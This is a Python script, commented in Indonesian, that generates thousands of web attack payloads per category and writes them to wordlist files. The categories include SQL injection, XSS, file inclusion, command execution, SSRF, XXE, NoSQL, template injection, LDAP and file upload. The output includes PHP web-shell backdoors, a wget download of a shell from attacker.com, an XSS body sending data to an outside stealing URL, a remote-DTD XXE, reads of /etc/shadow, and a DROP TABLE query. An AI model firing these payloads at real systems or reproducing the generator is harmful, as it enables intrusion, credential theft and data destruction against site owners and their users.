#!/usr/bin/env python3
# ================================================================
# generate_payloads.py - Generator Payload 5000+ per kategori
# ================================================================

import os
import sys
import random
import base64
import urllib.parse
from itertools import product

PAYLOAD_DIR = "payloads"
os.makedirs(PAYLOAD_DIR, exist_ok=True)

def save_payloads(filename, payloads):
    filepath = os.path.join(PAYLOAD_DIR, filename)
    with open(filepath, "w", encoding="utf-8") as f:
        f.write("\n".join(payloads))
    if os.path.exists(filepath) and os.path.getsize(filepath) > 0:
        print(f"[+] {filename}: {len(payloads)} payloads")
    else:
        print(f"[!] {filename} seems empty or not written properly.")

# ================================================================
# 1. SQL Injection (10.000+)
# ================================================================
def generate_sqli():
    p = set()
    prefixes = ["'", "\"", "`", ")", "}", "]", ""]
    ops = ["OR", "AND", "UNION", "SLEEP", "BENCHMARK"]
    vals = ["1=1", "'1'='1", "1=0", "'1'='2", "x=x", "x=y"]
    suffs = ["--", "#", "/*", ";%00", "%00", "--+-", ")--+-", "%23", ""]
    
    # Kombinasi dasar
    for pre, op, val, suf in product(prefixes, ops, vals, suffs):
        payload = f"{pre} {op} {val}{suf}"
        p.add(payload)
        p.add(urllib.parse.quote(payload))
        p.add(base64.b64encode(payload.encode()).decode())
    
    # ORDER BY
    for i in range(1, 21):
        p.add(f"' ORDER BY {i}--+-")
        p.add(f"' ORDER BY {i}%23")
        p.add(f"' ORDER BY {i}--")
    
    # UNION SELECT
    for i in range(1, 21):
        nulls = ','.join(['NULL'] * i)
        p.add(f"' UNION SELECT {nulls}--+-")
        p.add(f"' UNION SELECT {nulls}%23")
        p.add(f"' UNION SELECT {nulls}--")
    
    # Time based
    for i in [5, 10]:
        p.add(f"' AND SLEEP({i})--+-")
        p.add(f"' OR SLEEP({i})--+-")
    
    # Boolean
    p.add("' AND 1=1--+-")
    p.add("' AND 1=2--+-")
    p.add("' OR 1=1--+-")
    p.add("' OR 1=2--+-")
    
    # Stacked
    p.add("'; DROP TABLE users--+-")
    p.add("'; SELECT * FROM users--+-")
    
    # Tambahan random jika kurang dari 5000
    while len(p) < 5000:
        pre = random.choice(prefixes)
        op = random.choice(ops)
        val = random.choice(vals)
        suf = random.choice(suffs)
        payload = f"{pre} {op} {val}{suf}"
        p.add(payload)
        p.add(urllib.parse.quote(payload))
        p.add(base64.b64encode(payload.encode()).decode())
    
    return list(p)[:10000]

# ================================================================
# 2. XSS (10.000+)
# ================================================================
def generate_xss():
    p = set()
    tags = ["script", "img", "svg", "body", "div", "span", "input", "iframe", "a", "marquee", "details", "button"]
    events = ["onerror", "onload", "onclick", "onmouseover", "onfocus", "onchange", "onstart", "ontoggle"]
    bodies = ["alert(1)", "alert(document.cookie)", "alert('XSS')", "console.log(1)", "fetch('http://xss.pt/steal')"]
    
    for tag, ev, body in product(tags, events, bodies):
        p.add(f"<{tag} {ev}={body}>")
        p.add(f"<{tag} {ev}={body} />")
        p.add(urllib.parse.quote(f"<{tag} {ev}={body}>"))
        p.add(base64.b64encode(f"<{tag} {ev}={body}>".encode()).decode())
    
    # Polyglot
    polyglot = [
        "javascript:alert(1)",
        "'\"><img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
    ]
    p.update(polyglot)
    
    while len(p) < 5000:
        tag = random.choice(tags)
        ev = random.choice(events)
        body = random.choice(bodies)
        payload = f"<{tag} {ev}={body}>"
        p.add(payload)
        p.add(urllib.parse.quote(payload))
        p.add(base64.b64encode(payload.encode()).decode())
    
    return list(p)[:10000]

# ================================================================
# 3. LFI (5000+)
# ================================================================
def generate_lfi():
    p = set()
    paths = ["/etc/passwd", "/etc/shadow", "/etc/hosts", "/proc/self/environ", "/var/log/apache2/access.log", "C:\\windows\\win.ini"]
    prefixes = ["", "../../", "../../../", "../../../../", "....//", "..\\..\\"]
    
    for pre, path in product(prefixes, paths):
        p.add(pre + path)
        p.add(urllib.parse.quote(pre + path))
        p.add(pre + path + "%00")
        p.add(pre + path + "?")
        p.add(pre + path + "#")
    
    while len(p) < 5000:
        pre = random.choice(prefixes)
        path = random.choice(["/etc/passwd", "/etc/hosts", "C:\\windows\\win.ini"])
        p.add(pre + path)
        p.add(urllib.parse.quote(pre + path))
    
    return list(p)[:10000]

# ================================================================
# 4. RCE (5000+)
# ================================================================
def generate_rce():
    p = set()
    separators = [";", "|", "&&", "||", "&", "`", "$(", "\n"]
    commands = ["id", "whoami", "uname -a", "ls", "pwd", "cat /etc/passwd", "echo HACKED", "wget http://attacker.com/shell.php"]
    
    for sep, cmd in product(separators, commands):
        p.add(f"{sep} {cmd}")
        p.add(f"{sep}{cmd}")
        p.add(urllib.parse.quote(f"{sep} {cmd}"))
        p.add(base64.b64encode(f"{sep} {cmd}".encode()).decode())
    
    # PHP backdoor
    php = ["<?php system($_GET['cmd']); ?>", "<?php eval($_POST['cmd']); ?>", "<?=shell_exec($_GET['cmd'])?>"]
    for ph in php:
        p.add(ph)
        p.add(base64.b64encode(ph.encode()).decode())
        p.add(urllib.parse.quote(ph))
    
    while len(p) < 5000:
        sep = random.choice(separators)
        cmd = random.choice(commands)
        p.add(f"{sep} {cmd}")
        p.add(urllib.parse.quote(f"{sep} {cmd}"))
    
    return list(p)[:10000]

# ================================================================
# 5. SSRF (5000+)
# ================================================================
def generate_ssrf():
    p = set()
    protocols = ["http://", "https://", "file://", "gopher://", "dict://"]
    ips = ["127.0.0.1", "0.0.0.0", "localhost", "169.254.169.254", "[::1]"]
    
    for proto, ip in product(protocols, ips):
        p.add(f"{proto}{ip}")
        p.add(f"{proto}{ip}/")
        p.add(f"{proto}{ip}:80")
        p.add(f"{proto}{ip}:8080")
        p.add(urllib.parse.quote(f"{proto}{ip}"))
    
    bypass = ["http://127.0.0.1.xip.io", "http://localhost.nip.io", "http://127.0.0.1@google.com"]
    p.update(bypass)
    
    while len(p) < 5000:
        ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        p.add(f"http://{ip}")
        p.add(urllib.parse.quote(f"http://{ip}"))
    
    return list(p)[:10000]

# ================================================================
# 6. XXE (5000+)
# ================================================================
def generate_xxe():
    p = set()
    files = ["/etc/passwd", "/etc/hosts", "/etc/shadow", "C:/windows/win.ini"]
    for f in files:
        p.add(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file://{f}">]><root>&test;</root>')
        p.add(urllib.parse.quote(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file://{f}">]><root>&test;</root>'))
    p.add('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd"> %remote;]><root>&test;</root>')
    
    while len(p) < 5000:
        f = random.choice(["/etc/passwd", "/etc/hosts"])
        p.add(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file://{f}">]><root>&test;</root>')
        p.add(urllib.parse.quote(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file://{f}">]><root>&test;</root>'))
    
    return list(p)[:10000]

# ================================================================
# 7. NoSQL Injection (5000+)
# ================================================================
def generate_nosqli():
    p = set()
    ops = ["$ne", "$gt", "$lt", "$in", "$or", "$and", "$nin", "$nor", "$exists", "$regex", "$where"]
    fields = ["username", "password", "email", "id", "role"]
    
    for op, field in product(ops, fields):
        p.add(f"{field}[{op}]=admin")
        p.add(f'{{"{field}": {{"{op}": "admin"}}}}')
        p.add(urllib.parse.quote(f"{field}[{op}]=admin"))
    
    while len(p) < 5000:
        field = random.choice(fields)
        op = random.choice(ops)
        p.add(f"{field}[{op}]=admin")
        p.add(urllib.parse.quote(f"{field}[{op}]=admin"))
    
    return list(p)[:10000]

# ================================================================
# 8. SSTI (5000+)
# ================================================================
def generate_ssti():
    p = set()
    templates = ["{{ 7*7 }}", "{{ config }}", "{{ self.__class__.__mro__[1].__subclasses__() }}",
                 "<%= 7*7 %>", "<%= system('id') %>", "${ 7*7 }", "${ __import__('os').system('id') }"]
    p.update(templates)
    
    for i in range(1, 20):
        p.add(f"{{{{ {i}*{i} }}}}")
        p.add(f"${{ {i}*{i} }}")
        p.add(f"<%= {i}*{i} %>")
        p.add(urllib.parse.quote(f"{{{{ {i}*{i} }}}}"))
    
    while len(p) < 5000:
        a = random.randint(1,999)
        b = random.randint(1,999)
        p.add(f"{{{{ {a}*{b} }}}}")
        p.add(urllib.parse.quote(f"{{{{ {a}*{b} }}}}"))
    
    return list(p)[:10000]

# ================================================================
# 9. Command Injection (5000+)
# ================================================================
def generate_cmd_injection():
    p = set()
    separators = [";", "|", "&&", "||", "&", "`", "$(", "\n"]
    commands = ["id", "whoami", "uname -a", "ls", "pwd", "cat /etc/passwd"]
    
    for sep, cmd in product(separators, commands):
        p.add(f"{sep} {cmd}")
        p.add(f"{sep}{cmd}")
        p.add(urllib.parse.quote(f"{sep} {cmd}"))
        p.add(base64.b64encode(f"{sep} {cmd}".encode()).decode())
    
    while len(p) < 5000:
        sep = random.choice(separators)
        cmd = random.choice(commands)
        p.add(f"{sep} {cmd}")
        p.add(urllib.parse.quote(f"{sep} {cmd}"))
    
    return list(p)[:10000]

# ================================================================
# 10. LDAP (5000+)
# ================================================================
def generate_ldap():
    p = set()
    p.update(["*", "admin", "admin*", "*admin", "(&(uid=*)(userPassword=*))"])
    
    for i in range(1, 20):
        p.add(f"(&(uid=admin)(userPassword=*{i}))")
        p.add(urllib.parse.quote(f"(&(uid=admin)(userPassword=*{i}))"))
    
    while len(p) < 5000:
        p.add(f"(&(uid={random.choice(['admin','user'])})(userPassword=*))")
        p.add(urllib.parse.quote(f"(&(uid={random.choice(['admin','user'])})(userPassword=*))"))
    
    return list(p)[:10000]

# ================================================================
# 11. Open Redirect (5000+)
# ================================================================
def generate_open_redirect():
    p = set()
    domains = ["google.com", "facebook.com", "twitter.com", "evil.com", "attacker.com"]
    
    for d in domains:
        p.add(f"//{d}")
        p.add(f"https://{d}")
        p.add(f"http://{d}")
        p.add(urllib.parse.quote(f"//{d}"))
    
    while len(p) < 5000:
        d = random.choice(domains)
        p.add(f"//{d}")
        p.add(urllib.parse.quote(f"//{d}"))
    
    return list(p)[:10000]

# ================================================================
# 12. CSRF (5000+)
# ================================================================
def generate_csrf():
    p = set()
    p.update(["No CSRF token", "Missing CSRF protection", "Missing anti-CSRF token"])
    
    for i in range(1, 100):
        p.add(f"CSRF token missing in request {i}")
    
    while len(p) < 5000:
        p.add(f"Missing CSRF token {random.randint(1,999)}")
        p.add(f"CSRF token missing in {random.choice(['form','header','cookie','session'])}")
    
    return list(p)[:10000]

# ================================================================
# 13. File Upload (5000+)
# ================================================================
def generate_file_upload():
    p = set()
    exts = ["php", "php5", "phtml", "asp", "aspx", "jsp", "jspx", "py", "rb", "pl", "js", "go"]
    
    for ext in exts:
        p.add(f"shell.{ext}")
        p.add(f"shell.{ext}.jpg")
        p.add(f"shell.gif.{ext}")
        p.add(f"shell.{ext}.png")
        p.add(urllib.parse.quote(f"shell.{ext}"))
    
    while len(p) < 5000:
        ext = random.choice(exts)
        p.add(f"shell.{ext}.{random.choice(['jpg','png','gif'])}")
        p.add(urllib.parse.quote(f"shell.{ext}.{random.choice(['jpg','png','gif'])}"))
    
    return list(p)[:10000]

# ================================================================
# 14. Directory Traversal (5000+)
# ================================================================
def generate_directories():
    p = set()
    base = ["admin", "login", "dashboard", "panel", "cpanel", "wp-admin", "wp-content", "uploads", "backup", "temp", "tmp", "test", "dev", "shell", "phpmyadmin", "mysql", "database", "config", "conf", "htdocs", "www", "public_html"]
    p.update(base)
    
    for b in base:
        for i in range(1, 10):
            p.add(f"{b}{i}")
            p.add(f"{b}_{i}")
            p.add(f"{b}-{i}")
    
    while len(p) < 5000:
        b = random.choice(base)
        p.add(f"{b}{random.randint(1,999)}")
        p.add(urllib.parse.quote(f"{b}{random.randint(1,999)}"))
    
    return list(p)[:10000]

# ================================================================
# MAIN
# ================================================================
def main():
    print("[+] GENERATING 140.000+ PAYLOADS (5000+ per kategori)...")
    save_payloads("sqli.txt", generate_sqli())
    save_payloads("xss.txt", generate_xss())
    save_payloads("lfi.txt", generate_lfi())
    save_payloads("rce.txt", generate_rce())
    save_payloads("ssrf.txt", generate_ssrf())
    save_payloads("xxe.txt", generate_xxe())
    save_payloads("nosqli.txt", generate_nosqli())
    save_payloads("ssti.txt", generate_ssti())
    save_payloads("cmd_injection.txt", generate_cmd_injection())
    save_payloads("ldap.txt", generate_ldap())
    save_payloads("open_redirect.txt", generate_open_redirect())
    save_payloads("csrf.txt", generate_csrf())
    save_payloads("file_upload.txt", generate_file_upload())
    save_payloads("directories.txt", generate_directories())
    print("[+] ALL PAYLOADS GENERATED SUCCESSFULLY!")

if __name__ == "__main__":
    main()
